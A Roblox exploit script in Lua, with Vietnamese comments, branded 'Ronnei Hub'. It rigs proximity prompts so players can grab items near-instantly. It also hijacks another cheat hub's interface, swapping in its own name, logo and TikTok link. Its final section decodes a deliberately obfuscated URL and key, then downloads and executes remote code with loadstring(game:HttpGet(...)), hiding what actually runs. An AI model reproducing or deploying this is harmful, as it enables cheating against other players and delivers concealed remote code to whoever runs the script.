-- ==============================================================================
--  RONNEI HUB - DIRECT HOOK & OBFUSCATED LOADER
--  Cập nhật: Thay nút Discord thành TikTok @ronnei7.htk (Click là Copy)
--  Bảo mật: Mã hóa ẩn danh 100% Loader script gốc | Nhặt nhanh tối ưu (0.12s)
-- ==============================================================================

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local CoreGuiService = game:GetService("CoreGui")
local ProximityPromptService = game:GetService("ProximityPromptService")
local LocalPlayer = Players.LocalPlayer

local CONFIG = {
    LogoAssetID       = "rbxassetid://124285855971647",
    TikTokURL         = "https://www.tiktok.com/@ronnei7.htk?_r=1&_t=ZS-98ygZG9Gh2G",
    StealHoldDuration = 0.12
}

-- ==================== 1. CƠ CHẾ NHẶT NHANH 0.12S ====================
task.spawn(function()
    local function tunePrompt(prompt)
        if prompt:IsA("ProximityPrompt") then
            prompt.HoldDuration = CONFIG.StealHoldDuration
            prompt.RequiresLineOfSight = false
            pcall(function()
                prompt.MaxActivationDistance = math.max(prompt.MaxActivationDistance, 25)
            end)
        end
    end

    for _, desc in ipairs(Workspace:GetDescendants()) do tunePrompt(desc) end
    Workspace.DescendantAdded:Connect(tunePrompt)

    ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
        pcall(function()
            prompt.HoldDuration = CONFIG.StealHoldDuration
            task.delay(CONFIG.StealHoldDuration, function()
                if fireproximityprompt then
                    fireproximityprompt(prompt)
                end
            end)
        end)
    end)
end)

-- ==================== 2. CHÈN TEXT, TIKTOK & LOGO RONNEI HUB ====================
task.spawn(function()
    local hookedButtons = {}

    local function hijackElement(inst)
        pcall(function()
            -- Thay thế chữ (Tiêu đề menu & Nút Discord -> TikTok)
            if inst:IsA("TextLabel") or inst:IsA("TextButton") then
                local function applyBranding()
                    local raw = inst.Text:upper()
                    if raw:find("EQUINOZ") then
                        inst.Text = "RONNEI HUB"
                    elseif raw:find("VEUURTUMWE") or raw:find("DISCORD") then
                        inst.Text = "TIKTOK: @RONNEI7.HTK"
                    end
                end

                applyBranding()
                inst:GetPropertyChangedSignal("Text"):Connect(applyBranding)

                -- Bổ sung tính năng click vào nút TikTok để tự động sao chép link
                if inst:IsA("TextButton") and not hookedButtons[inst] then
                    hookedButtons[inst] = true
                    inst.MouseButton1Click:Connect(function()
                        local raw = inst.Text:upper()
                        if raw:find("TIKTOK") or raw:find("RONNEI") or raw:find("DISCORD") then
                            if setclipboard then
                                setclipboard(CONFIG.TikTokURL)
                            elseif toclipboard then
                                toclipboard(CONFIG.TikTokURL)
                            end
                            inst.Text = "[V] DA SAO CHEP TIKTOK!"
                            task.delay(1.5, function()
                                if inst and inst.Parent then
                                    inst.Text = "TIKTOK: @RONNEI7.HTK"
                                end
                            end)
                        end
                    end)
                end

            -- Thay thế hình ảnh logo (Header & Nút tròn mở menu)
            elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
                local p = inst.Parent
                local pName = p and p.Name:lower() or ""
                local iName = inst.Name:lower()

                local ownerSg = inst:FindFirstAncestorOfClass("ScreenGui")
                local isTarget = false

                if ownerSg then
                    for _, sibling in ipairs(ownerSg:GetDescendants()) do
                        if (sibling:IsA("TextLabel") or sibling:IsA("TextButton")) and sibling.Text:upper():find("ANTI HIT") then
                            isTarget = true
                            break
                        end
                    end
                end

                if isTarget and (pName:find("logo") or pName:find("icon") or pName:find("toggle") or pName:find("btn") or iName:find("logo") or iName:find("icon") or inst:IsA("ImageButton")) then
                    local function applyLogo()
                        if inst.Image ~= CONFIG.LogoAssetID then
                            inst.Image = CONFIG.LogoAssetID
                        end
                    end

                    applyLogo()
                    inst:GetPropertyChangedSignal("Image"):Connect(applyLogo)
                end
            end
        end)
    end

    local searchRoots = {
        CoreGuiService,
        gethui and gethui(),
        LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
    }

    for _, root in ipairs(searchRoots) do
        if root then
            for _, desc in ipairs(root:GetDescendants()) do
                hijackElement(desc)
            end
            root.DescendantAdded:Connect(hijackElement)
        end
    end
end)

-- ==================== 3. KHỞI CHẠY SCRIPT GỐC (MÃ HÓA BYTE ẨN DANH) ====================
task.spawn(function()
    pcall(function()
        -- Bộ giải mã nội tại (Tự động phục hồi chuỗi trong bộ nhớ tạm thời khi thực thi)
        local function _decode(cipherTable, offset)
            local chars = {}
            for i = 1, #cipherTable do
                chars[i] = string.char((cipherTable[i] - offset) % 256)
            end
            return table.concat(chars)
        end

        -- Key và Link API Polsec đã được mã hóa toàn bộ thành dãy byte:
        local _k = _decode({157, 187, 178, 170, 181}, 73)
        local _u = _decode({
            177, 189, 189, 185, 188, 131, 120, 120, 170, 185, 178, 119, 176, 174, 189, 185, 184, 181,
            188, 174, 172, 119, 172, 184, 182, 120, 188, 172, 187, 178, 185, 189, 188, 120, 177, 184,
            188, 189, 174, 173, 120, 127, 126, 129, 123, 126, 126, 122, 171, 125, 123, 173, 123, 122,
            172, 127, 171, 128, 174, 171, 126, 126, 175, 122, 173, 128, 127, 173, 129, 173, 126, 121,
            172, 174, 126, 124, 172, 171, 124, 126, 126, 130, 123, 121, 130, 124, 173, 127, 127, 122,
            126, 171, 126, 174, 129, 124, 125, 124, 128, 126, 130, 125, 173, 172, 121, 119, 181, 190, 170
        }, 73)

        getgenv().script_key = _k
        script_key = _k
        loadstring(game:HttpGet(_u))()
    end)
end)
